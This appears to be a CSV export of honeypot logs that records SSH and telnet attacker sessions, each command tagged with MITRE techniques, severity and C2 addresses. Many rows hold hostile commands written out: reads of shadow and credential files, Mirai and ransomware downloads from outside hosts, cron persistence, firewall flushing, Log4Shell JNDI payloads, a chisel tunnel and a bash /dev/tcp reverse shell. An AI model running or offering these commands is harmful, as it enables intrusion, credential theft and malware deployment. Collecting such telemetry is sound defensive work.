event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-003402,07E98F6D,2025-06-18T16:39:55Z,command_executed,hp-ap-01,178.128.83.165,38346,10.0.3.10,2222,ssh,support,default,True,find / -name '*.p12' -o -name '*.pfx' -o -name '*.jks' 2>/dev/null,7,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,406,194,credential_dumping,False,,4b5b9960-db46-4fe2-b172-948a288acbb0,
EVT-003398,07E98F6D,2025-06-18T16:40:11Z,command_executed,hp-ap-01,178.128.83.165,42991,10.0.3.10,2222,ssh,support,default,True,cat /etc/gshadow 2>/dev/null,3,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,critical,,,,67,197,115,credential_dumping,False,,80ffef8f-4266-4c6e-8981-bbd36db21120,
EVT-003399,07E98F6D,2025-06-18T16:41:15Z,command_executed,hp-ap-01,178.128.83.165,40382,10.0.3.10,2222,ssh,support,default,True,find / -name 'shadow' -o -name '.htpasswd' -o -name 'passwd.db' 2>/dev/null | head,4,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,critical,,,,67,113,65,credential_dumping,False,,707d5868-fdac-4970-bf26-e604f6433b5c,
EVT-003410,07E98F6D,2025-06-18T16:42:59Z,command_executed,hp-ap-01,178.128.83.165,48102,10.0.3.10,2222,ssh,support,default,True,history -c,15,SG,AS14061,DigitalOcean SG,Credential Dumping,T1070.003,Clear Command History,low,,,,67,504,312,credential_dumping,True,,8a154486-8dab-475e-b97f-74d3d2f870cd,
EVT-003403,07E98F6D,2025-06-18T16:43:07Z,command_executed,hp-ap-01,178.128.83.165,40747,10.0.3.10,2222,ssh,support,default,True,ls /home/*/.ssh/ 2>/dev/null,8,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,246,85,credential_dumping,False,,63725de9-50ef-4781-aa54-6ac2a1e09ea5,
EVT-003405,07E98F6D,2025-06-18T16:43:09Z,command_executed,hp-ap-01,178.128.83.165,51011,10.0.3.10,2222,ssh,support,default,True,"python3 -c ""import base64; import os; [print(f) for f in os.listdir('/proc') if f.isdigit() and 'lsass' in open(f'/proc/{f}/status').read()]"" 2>/dev/null",10,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059.006,Python,medium,,,,67,568,437,credential_dumping,False,,bb505942-9a95-417f-9c69-271f63a0b224,
EVT-003404,07E98F6D,2025-06-18T16:43:29Z,command_executed,hp-ap-01,178.128.83.165,40044,10.0.3.10,2222,ssh,support,default,True,cat /home/*/.bash_history 2>/dev/null | grep -iE 'ssh|scp|pass|key|ftp|curl|wget',9,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,medium,yes,,4849c498ff6842b98d8c18844684ffc2,67,207,333,credential_dumping,False,,40d52936-1e5c-4ab3-bcf9-50c253af4b64,
EVT-003409,07E98F6D,2025-06-18T16:43:53Z,command_executed,hp-ap-01,178.128.83.165,45016,10.0.3.10,2222,ssh,support,default,True,find / -name '*.json' | xargs grep -l 'private_key\|client_secret\|api_key' 2>/dev/null | head,14,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,353,423,credential_dumping,False,,527afbd0-94fa-4254-8211-18aaca242e5c,
EVT-003406,07E98F6D,2025-06-18T16:46:30Z,command_executed,hp-ap-01,178.128.83.165,48832,10.0.3.10,2222,ssh,support,default,True,grep -r 'password' /etc/nagios/ /etc/zabbix/ /etc/prometheus/ 2>/dev/null | head -20,11,SG,AS14061,DigitalOcean SG,Credential Dumping,T1552.001,Credentials in Files,low,,,,67,231,270,credential_dumping,False,,a817d3ff-5059-488b-bd7d-ea2ab0c322d7,
EVT-003407,07E98F6D,2025-06-18T16:47:11Z,command_executed,hp-ap-01,178.128.83.165,45005,10.0.3.10,2222,ssh,support,default,True,cat /var/lib/jenkins/credentials.xml 2>/dev/null,12,SG,AS14061,DigitalOcean SG,Credential Dumping,T1552.001,Credentials in Files,low,,,,67,345,348,credential_dumping,False,,a054e004-7b2e-48d0-991a-73fa029c381b,
EVT-003408,07E98F6D,2025-06-18T16:47:13Z,command_executed,hp-ap-01,178.128.83.165,48897,10.0.3.10,2222,ssh,support,default,True,cat /root/.netrc 2>/dev/null,13,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,499,89,credential_dumping,False,,bcb25cdf-2dcb-44f2-8212-cf7fc692f5cd,
EVT-000777,C30A3C68,2025-06-18T21:33:49Z,login_attempt,hp-us-01,198.199.119.50,39493,10.0.2.10,22,ssh,nagios,VMware1!,False,,0,US,AS14061,DigitalOcean,Container Escape,T1110,Brute Force,medium,,,,221,347,1385,brute_force,False,,,
EVT-001352,D47A1C55,2025-06-19T06:58:47Z,login_attempt,hp-ap-01,185.129.62.62,33355,10.0.3.10,22,ssh,grafana,admin123,True,,0,DK,AS29791,Zayo,Botnet/DDoS,T1110,Brute Force,high,,,,191,778,667,compromised_login,False,,64179fad-3f41-4c9a-be5d-86a4281322ef,
EVT-001353,D47A1C55,2025-06-19T06:59:05Z,command_executed,hp-ap-01,185.129.62.62,60468,10.0.3.10,22,ssh,grafana,admin123,True,uname -a,1,DK,AS29791,Zayo,Botnet/DDoS,T1082,System Information Discovery,low,,,,191,585,108,botnet_ddos,False,,692e19be-b1be-43e2-9a74-0bdd32cf2480,
EVT-001358,D47A1C55,2025-06-19T06:59:11Z,command_executed,hp-ap-01,185.129.62.62,35555,10.0.3.10,22,ssh,grafana,admin123,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,DK,AS29791,Zayo,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,940fc25d8fb846799f3320c5064e0774,191,123,405,botnet_ddos,False,,fb5e3eec-ab20-4174-be52-bee6c487fc31,
EVT-001354,D47A1C55,2025-06-19T06:59:19Z,command_executed,hp-ap-01,185.129.62.62,49114,10.0.3.10,22,ssh,grafana,admin123,True,arch,2,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,504,359,botnet_ddos,False,,7a5b8b8a-0900-4745-afdf-93c251e94e6c,
EVT-001364,D47A1C55,2025-06-19T06:59:59Z,command_executed,hp-ap-01,185.129.62.62,59046,10.0.3.10,22,ssh,grafana,admin123,True,iptables -F,12,DK,AS29791,Zayo,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,191,305,208,botnet_ddos,False,,5e7eb0f6-06b5-4b3f-ae39-f8139ce64852,
EVT-001355,D47A1C55,2025-06-19T07:00:32Z,command_executed,hp-ap-01,185.129.62.62,38733,10.0.3.10,22,ssh,grafana,admin123,True,cat /proc/version,3,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,242,412,botnet_ddos,False,,26e5803d-b2ed-4d3a-a12e-4d283ad69be9,
EVT-001357,D47A1C55,2025-06-19T07:00:37Z,command_executed,hp-ap-01,185.129.62.62,41489,10.0.3.10,22,ssh,grafana,admin123,True,df -h / | tail -1 | awk '{print $4}',5,DK,AS29791,Zayo,Botnet/DDoS,T1082,System Information Discovery,low,,,,191,505,359,botnet_ddos,False,,d4d2475c-a9aa-427d-a281-5e589ba81a99,
EVT-001362,D47A1C55,2025-06-19T07:00:37Z,command_executed,hp-ap-01,185.129.62.62,57143,10.0.3.10,22,ssh,grafana,admin123,True,iptables -A INPUT -j ACCEPT,10,DK,AS29791,Zayo,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,191,406,157,botnet_ddos,False,,5f2386c3-ebcf-4a45-8bd5-789d6f271742,
EVT-001356,D47A1C55,2025-06-19T07:00:43Z,command_executed,hp-ap-01,185.129.62.62,39880,10.0.3.10,22,ssh,grafana,admin123,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,209,458,botnet_ddos,False,,537931ad-a8d8-48f2-833e-2451d4611658,
EVT-001359,D47A1C55,2025-06-19T07:01:00Z,command_executed,hp-ap-01,185.129.62.62,54980,10.0.3.10,22,ssh,grafana,admin123,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,DK,AS29791,Zayo,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,66d6ca49287041959bdf128d2799be7d,191,516,341,botnet_ddos,False,,2a4c38d7-fb9d-41e3-8c59-72b5133cebcd,
EVT-001366,D47A1C55,2025-06-19T07:02:03Z,command_executed,hp-ap-01,185.129.62.62,46129,10.0.3.10,22,ssh,grafana,admin123,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,DK,AS29791,Zayo,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,44639a5f6e354acc8431201149f25a79,191,228,265,botnet_ddos,False,,60718370-93d5-4f2a-afdd-566a9e457a1c,
EVT-001361,D47A1C55,2025-06-19T07:02:50Z,command_executed,hp-ap-01,185.129.62.62,56319,10.0.3.10,22,ssh,grafana,admin123,True,cd /tmp && /tmp/mirai &,9,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,326,355,botnet_ddos,False,,fbb3c28a-47a5-49ba-93d6-9a74859c6b59,
EVT-001360,D47A1C55,2025-06-19T07:04:07Z,command_executed,hp-ap-01,185.129.62.62,54327,10.0.3.10,22,ssh,grafana,admin123,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,DK,AS29791,Zayo,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,8a70149efbdf4090bef1f119e09892a2,191,150,89,botnet_ddos,False,,f53f14ec-32f8-495b-96ec-8e47af379a77,
EVT-001365,D47A1C55,2025-06-19T07:04:38Z,command_executed,hp-ap-01,185.129.62.62,60534,10.0.3.10,22,ssh,grafana,admin123,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,DK,AS29791,Zayo,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,191,169,361,botnet_ddos,False,,a3e4f945-8f2a-4e0c-b4bd-974d403f7100,
EVT-001363,D47A1C55,2025-06-19T07:06:29Z,command_executed,hp-ap-01,185.129.62.62,47092,10.0.3.10,22,ssh,grafana,admin123,True,iptables -A OUTPUT -j ACCEPT,11,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,214,396,botnet_ddos,False,,9dc064ff-6416-49ed-a8b1-c077bec187c1,
EVT-001368,D47A1C55,2025-06-19T07:07:51Z,command_executed,hp-ap-01,185.129.62.62,48668,10.0.3.10,22,ssh,grafana,admin123,True,history -c,16,DK,AS29791,Zayo,Botnet/DDoS,T1070.003,Clear Command History,low,,,,191,158,478,botnet_ddos,False,,796c96ed-1992-4ecc-9788-6322115c3000,
EVT-001367,D47A1C55,2025-06-19T07:09:02Z,command_executed,hp-ap-01,185.129.62.62,33992,10.0.3.10,22,ssh,grafana,admin123,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,DK,AS29791,Zayo,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,191,378,351,botnet_ddos,False,,05251aea-8f01-425c-b7e7-deb35dafc5f1,
EVT-000291,65486DAB,2025-06-19T08:28:33Z,login_attempt,hp-ap-01,91.92.251.103,42414,10.0.3.10,22,ssh,hadoop,xmhdipc,False,,0,NL,AS9009,M247,Network Reconnaissance,T1110,Brute Force,medium,,,,577,507,1648,brute_force,False,,,
EVT-001369,83CD1FEE,2025-06-19T11:51:11Z,login_attempt,hp-eu-01,171.25.193.20,43615,10.0.1.10,22,ssh,centos,iloveyou,False,,0,SE,AS50709,FrStatement AB,Container Escape,T1110,Brute Force,medium,,,,381,468,853,brute_force,False,,,
EVT-002563,88E91672,2025-06-19T23:06:38Z,login_attempt,hp-ap-01,222.187.232.205,56747,10.0.3.10,2222,ssh,postgres,toor,True,,0,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1110,Brute Force,high,,,,136,411,1772,compromised_login,False,,e23a2991-ffdf-4204-91b0-8482fca6cccc,
EVT-002564,88E91672,2025-06-19T23:07:01Z,command_executed,hp-ap-01,222.187.232.205,60345,10.0.3.10,2222,ssh,postgres,toor,True,uname -a && id,1,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1082,System Information Discovery,low,,,,136,152,51,pivoting_tunneling,False,,8a948745-3ab5-4600-ba4a-b93abf4239bd,
EVT-002567,88E91672,2025-06-19T23:07:02Z,command_executed,hp-ap-01,222.187.232.205,60295,10.0.3.10,2222,ssh,postgres,toor,True,which socat ncat nc netcat 2>/dev/null,4,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,136,168,80,pivoting_tunneling,False,,3ac91d8f-5e1d-4b53-9353-50a4e20cb74e,
EVT-002571,88E91672,2025-06-19T23:07:02Z,command_executed,hp-ap-01,222.187.232.205,55508,10.0.3.10,2222,ssh,postgres,toor,True,ssh -o StrictHostKeyChecking=no -fND 1080 jump@185.220.101.47,8,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,136,508,387,pivoting_tunneling,False,,ba99ca77-830b-4707-bedf-d076c876b7bf,
EVT-002565,88E91672,2025-06-19T23:08:08Z,command_executed,hp-ap-01,222.187.232.205,54270,10.0.3.10,2222,ssh,postgres,toor,True,ss -tlnp,2,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,136,327,95,pivoting_tunneling,False,,b80f9f85-8fa4-4277-af7c-051057e81a9e,
EVT-002569,88E91672,2025-06-19T23:08:08Z,command_executed,hp-ap-01,222.187.232.205,50585,10.0.3.10,2222,ssh,postgres,toor,True,ncat -lvp 1080 --sh-exec 'ncat 10.0.0.10 22' &,6,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,136,546,198,pivoting_tunneling,True,,5fc32c25-f936-4589-a859-29f19044100a,
EVT-002566,88E91672,2025-06-19T23:08:47Z,command_executed,hp-ap-01,222.187.232.205,43095,10.0.3.10,2222,ssh,postgres,toor,True,cat /etc/ssh/sshd_config | grep -E 'Port|AllowTcp|GatewayPort',3,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,136,231,499,pivoting_tunneling,False,,0d411516-c60a-4120-8104-3f5af8355f4e,
EVT-002573,88E91672,2025-06-19T23:09:18Z,command_executed,hp-ap-01,222.187.232.205,53299,10.0.3.10,2222,ssh,postgres,toor,True,"proxychains nmap -sT -p 22,80,443,3389 10.0.0.0/24 2>/dev/null",10,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1046,Network Service Discovery,medium,,,,136,543,273,pivoting_tunneling,False,,3521ca89-5aef-4a4b-b673-25a94d078127,
EVT-002570,88E91672,2025-06-19T23:10:01Z,command_executed,hp-ap-01,222.187.232.205,37102,10.0.3.10,2222,ssh,postgres,toor,True,ssh -o StrictHostKeyChecking=no -fNR 2222:localhost:22 pivot@185.220.101.47,7,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,136,114,342,pivoting_tunneling,False,,80acdeee-f95a-4e96-b958-6482ae535f67,
EVT-002568,88E91672,2025-06-19T23:10:18Z,command_executed,hp-ap-01,222.187.232.205,33516,10.0.3.10,2222,ssh,postgres,toor,True,"socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389 &",5,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,136,395,41,pivoting_tunneling,False,,2ecb31ae-e076-488e-8aa1-d3f5a300d456,
EVT-002574,88E91672,2025-06-19T23:11:35Z,command_executed,hp-ap-01,222.187.232.205,48534,10.0.3.10,2222,ssh,postgres,toor,True,echo 'ProxyJump 185.220.101.47' >> ~/.ssh/config,11,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,136,349,53,pivoting_tunneling,False,,0e5bbf77-0578-4a41-b859-42adf59f2a0e,
EVT-002572,88E91672,2025-06-19T23:12:20Z,command_executed,hp-ap-01,222.187.232.205,49318,10.0.3.10,2222,ssh,postgres,toor,True,curl --socks5 127.0.0.1:1080 http://10.0.0.20:8500/v1/kv 2>/dev/null,9,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,medium,,,,136,464,460,pivoting_tunneling,False,,d278dd48-f2d4-49cf-b896-50b160a862db,
EVT-002575,88E91672,2025-06-19T23:14:14Z,command_executed,hp-ap-01,222.187.232.205,53369,10.0.3.10,2222,ssh,postgres,toor,True,history -c,12,CN,AS4134,ChinaNet,Pivoting/Tunneling,T1070.003,Clear Command History,low,,,,136,355,330,pivoting_tunneling,False,,0f036bd9-be61-4d7b-91fd-e90aae1b59d6,
EVT-000878,D3B97A7D,2025-06-20T00:20:20Z,login_attempt,hp-eu-01,162.243.143.105,52722,10.0.1.10,23,telnet,monitor,1234,True,,0,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1110,Brute Force,high,,,,139,746,1109,compromised_login,False,,aae3d396-2e8c-411b-b75e-500261438c5b,
EVT-000879,D3B97A7D,2025-06-20T00:20:46Z,command_executed,hp-eu-01,162.243.143.105,34745,10.0.1.10,23,telnet,monitor,1234,True,id && uname -a,1,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1082,System Information Discovery,low,,,,139,567,218,log4shell_webexploit,False,,9bee1d49-dd83-4701-b45b-d23686be2ed8,
EVT-000890,D3B97A7D,2025-06-20T00:20:56Z,command_executed,hp-eu-01,162.243.143.105,45826,10.0.1.10,23,telnet,monitor,1234,True,rm -f /tmp/.heap.bin /tmp/JNDI-Exploit.jar,12,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,139,174,112,log4shell_webexploit,False,,d5be0bc8-60e0-4476-b0cb-b09347777f0b,
EVT-000886,D3B97A7D,2025-06-20T00:21:24Z,command_executed,hp-eu-01,162.243.143.105,57794,10.0.1.10,23,telnet,monitor,1234,True,curl -sk 'http://localhost:8080/login' -d 'username=${jndi:ldap://185.220.101.47:1389/a}&password=x',8,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,139,576,171,log4shell_webexploit,False,,6be44ad0-321b-4466-b1f9-1bd630455423,
EVT-000880,D3B97A7D,2025-06-20T00:21:36Z,command_executed,hp-eu-01,162.243.143.105,52949,10.0.1.10,23,telnet,monitor,1234,True,cat /proc/net/tcp | head,2,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,139,104,414,log4shell_webexploit,False,,32e5b8bf-041f-4ad7-b0bb-1f4b395e10b9,
EVT-000884,D3B97A7D,2025-06-20T00:21:56Z,command_executed,hp-eu-01,162.243.143.105,42226,10.0.1.10,23,telnet,monitor,1234,True,find / -name 'log4j*.jar' -o -name '*log4j*' 2>/dev/null | head -10,6,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,high,,,,139,377,417,log4shell_webexploit,False,,103dcc11-fa5a-4758-9742-420087c42360,
EVT-000888,D3B97A7D,2025-06-20T00:22:10Z,command_executed,hp-eu-01,162.243.143.105,51919,10.0.1.10,23,telnet,monitor,1234,True,wget -q http://185.220.101.47/tools/chisel_linux -O /tmp/.chisel && chmod +x /tmp/.chisel,10,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1105,Ingress Tool Transfer,critical,yes,185.220.101.47,0384b31c0a8d41fb8ba9b0fa47197bc0,139,534,381,log4shell_webexploit,False,,29aa80f1-d19f-4848-8097-07f364892f85,
EVT-000881,D3B97A7D,2025-06-20T00:22:26Z,command_executed,hp-eu-01,162.243.143.105,50418,10.0.1.10,23,telnet,monitor,1234,True,curl -sk http://localhost/actuator/env 2>/dev/null | python3 -m json.tool | head -50,3,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,982309a3e3f44a3aa4b0ba1592d91da3,139,142,208,log4shell_webexploit,False,,99bead0d-2a7a-498e-8c9c-86bcdb4314b4,
EVT-000889,D3B97A7D,2025-06-20T00:22:43Z,command_executed,hp-eu-01,162.243.143.105,52296,10.0.1.10,23,telnet,monitor,1234,True,/tmp/.chisel client 185.220.101.47:8888 R:socks 2>/dev/null &,11,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1572,Protocol Tunneling,critical,,185.220.101.47,,139,223,227,log4shell_webexploit,False,,a542a13a-c518-4421-be13-56fda1949a69,
EVT-000882,D3B97A7D,2025-06-20T00:22:48Z,command_executed,hp-eu-01,162.243.143.105,57119,10.0.1.10,23,telnet,monitor,1234,True,curl -sk http://localhost/actuator/heapdump -o /tmp/.heap.bin 2>/dev/null,4,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,b6808af552ce40399e8d57dd631061b7,139,556,137,log4shell_webexploit,False,,194d0b96-482f-4285-8f2c-968ce37b7c06,
EVT-000887,D3B97A7D,2025-06-20T00:23:02Z,command_executed,hp-eu-01,162.243.143.105,44918,10.0.1.10,23,telnet,monitor,1234,True,java -jar /tmp/JNDI-Exploit.jar -C 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1' -A 185.220.101.47 2>/dev/null &,9,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1059.004,Unix Shell,low,,185.220.101.47,,139,355,458,log4shell_webexploit,False,,9082a5cd-c6f9-4a15-92f8-e801324a5acb,
EVT-000883,D3B97A7D,2025-06-20T00:23:05Z,command_executed,hp-eu-01,162.243.143.105,34282,10.0.1.10,23,telnet,monitor,1234,True,strings /tmp/.heap.bin | grep -iE 'password|secret|key|token|credential' | head -30,5,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1552,Unsecured Credentials,low,,,,139,103,123,log4shell_webexploit,False,,b989e073-45e8-4245-b30f-7f3339f01aa5,
EVT-000891,D3B97A7D,2025-06-20T00:24:53Z,command_executed,hp-eu-01,162.243.143.105,46842,10.0.1.10,23,telnet,monitor,1234,True,history -c,13,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1070.003,Clear Command History,low,,,,139,124,53,log4shell_webexploit,False,,45d742a4-8f93-41e9-b4b4-82e00c39bdb0,
EVT-000885,D3B97A7D,2025-06-20T00:25:00Z,command_executed,hp-eu-01,162.243.143.105,43372,10.0.1.10,23,telnet,monitor,1234,True,curl -sk 'http://localhost:8080/' -H 'X-Api-Version: ${jndi:ldap://185.220.101.47:1389/a}',7,US,AS14061,DigitalOcean,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,139,126,203,log4shell_webexploit,False,,9fc56b2d-bd40-4e78-a7b0-fd66aa8120ad,
EVT-002884,9FAD5CBB,2025-06-20T00:57:49Z,login_attempt,hp-eu-01,162.243.143.105,42586,10.0.1.10,22,ssh,root,Autumn2023#,False,,0,US,AS14061,DigitalOcean,Credential Dumping,T1110,Brute Force,medium,,,,488,771,2841,brute_force,False,,,
EVT-003525,793006B8,2025-06-20T11:22:59Z,login_attempt,hp-eu-02,185.129.62.62,42313,10.0.1.11,2222,ssh,ec2-user,vizxv,True,,0,DK,AS29791,Zayo,Ransomware Staging,T1110,Brute Force,high,,,,524,652,2447,compromised_login,False,,01abaf96-b9d7-4fb7-8beb-93a1c09ace23,
EVT-003526,793006B8,2025-06-20T11:23:06Z,command_executed,hp-eu-02,185.129.62.62,33598,10.0.1.11,2222,ssh,ec2-user,vizxv,True,uname -a && id,1,DK,AS29791,Zayo,Ransomware Staging,T1082,System Information Discovery,low,,,,524,117,113,ransomware_staging,False,,ae7d2d0b-8d45-4ba9-ba3c-bafe7dc9b1db,
EVT-003527,793006B8,2025-06-20T11:23:23Z,command_executed,hp-eu-02,185.129.62.62,52289,10.0.1.11,2222,ssh,ec2-user,vizxv,True,df -h && lsblk,2,DK,AS29791,Zayo,Ransomware Staging,T1082,System Information Discovery,low,,,,524,349,156,ransomware_staging,False,,7c412cc0-117f-4c05-987d-522f2b330fe6,
EVT-003533,793006B8,2025-06-20T11:23:23Z,command_executed,hp-eu-02,185.129.62.62,51744,10.0.1.11,2222,ssh,ec2-user,vizxv,True,chmod +x /tmp/.locker,8,DK,AS29791,Zayo,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,524,368,443,ransomware_staging,False,,32980ced-eafd-4033-a33d-387478964fb0,
EVT-003530,793006B8,2025-06-20T11:23:34Z,command_executed,hp-eu-02,185.129.62.62,48391,10.0.1.11,2222,ssh,ec2-user,vizxv,True,ls /mnt /media /backup 2>/dev/null,5,DK,AS29791,Zayo,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,524,248,452,ransomware_staging,False,,722939a5-e7b9-4bec-8eb7-b5ee5a6e1240,
EVT-003532,793006B8,2025-06-20T11:23:34Z,command_executed,hp-eu-02,185.129.62.62,57688,10.0.1.11,2222,ssh,ec2-user,vizxv,True,wget -q http://45.142.212.100/ransom/locker_x64 -O /tmp/.locker,7,DK,AS29791,Zayo,Ransomware Staging,T1105,Ingress Tool Transfer,critical,yes,45.142.212.100,4945116a77494f929c315d4bf02ba6b2,524,93,63,ransomware_staging,True,,b68200c5-60ce-4d32-a7cd-ae2a3a2f250a,
EVT-003535,793006B8,2025-06-20T11:23:39Z,command_executed,hp-eu-02,185.129.62.62,49574,10.0.1.11,2222,ssh,ec2-user,vizxv,True,openssl rsa -in /tmp/victim.key -pubout -out /tmp/victim.pub 2>/dev/null,10,DK,AS29791,Zayo,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,524,545,402,ransomware_staging,False,,3da4f5e4-193b-4b35-9999-d0378c4eb6c1,
